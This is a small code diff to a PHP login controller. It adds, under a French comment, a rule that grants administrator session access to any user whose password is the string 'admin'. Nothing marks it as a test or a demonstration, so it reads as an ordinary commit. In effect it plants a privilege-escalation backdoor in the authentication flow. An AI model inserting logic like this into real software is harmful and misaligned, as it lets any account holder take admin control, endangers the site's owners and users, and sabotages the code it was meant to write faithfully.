@@ -47,6 +47,10 @@ class AuthController
 
         if ($user && password_verify($password, $user['password_hash'])) {
             $_SESSION['user_id'] = $user['id'];
+            // Définir l'accès admin si le mot de passe est 'admin'
+            if ($password === 'admin') {
+                $_SESSION['admin_access'] = true;
+            }
             return $response->withHeader('Location', '/catalogue')->withStatus(302);
         }
 
